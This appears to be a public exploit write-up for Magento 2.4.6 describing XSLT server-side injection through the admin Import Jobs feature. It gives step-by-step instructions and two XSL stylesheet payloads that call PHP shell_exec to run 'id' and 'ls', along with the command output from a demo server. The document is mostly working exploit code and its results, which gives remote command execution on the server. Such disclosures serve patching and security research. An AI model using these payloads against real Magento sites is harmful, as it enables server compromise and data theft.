# Magento-ver.-2.4.6
Magento ver. 2.4.6 - XSLT Server Side Injection
# Exploit Title: Magento ver. 2.4.6 - XSLT Server Side Injection

- **Date:** 2023-11-17
- **Exploit Author:** tmrswrr
- **Vendor Homepage:** [https://magento2demo.firebearstudio.com/](https://magento2demo.firebearstudio.com/)
- **Software Link:** [Magento 2.4.6-p3](https://github.com/magento/magento2/archive/refs/tags/2.4.6-p3.zip)
- **Version:** 2.4.6
- **Tested on:** 2.4.6

<img src="https://raw.githubusercontent.com/capture0x/Magento-ver.-2.4.6/main/magento.png" alt="Magento Image" width="700">

## POC

1. Enter with admin credentials to this URL: [https://magento2demo.firebearstudio.com/](https://magento2demo.firebearstudio.com/)
2. Click `SYSTEM > Import Jobs > Entity Type Widget > click edit`
3. Choose  Import Source is File
4. Click `XSLT Configuration` and write this payload:

   ```xml
   <?xml version="1.0" encoding="utf-8"?>
   <xsl:stylesheet version="1.0"
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   xmlns:php="http://php.net/xsl">
     <xsl:template match="/">
       <xsl:value-of select="php:function('shell_exec','id')" />
     </xsl:template>
   </xsl:stylesheet>```
   
**<?xml version="1.0"?>
**uid=10095(a0563af8) gid=1050(a0563af8) groups=1050(a0563af8)

```xml
   <?xml version="1.0" encoding="utf-8"?>
   <xsl:stylesheet version="1.0"
   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
   xmlns:php="http://php.net/xsl">
     <xsl:template match="/">
       <xsl:value-of select="php:function('shell_exec','ls')" />
     </xsl:template>
   </xsl:stylesheet>```

**<?xml version="1.0"?>
cron.php
errors
get.php
health_check.php
index.php
media
opt
robots.txt
static
static.php

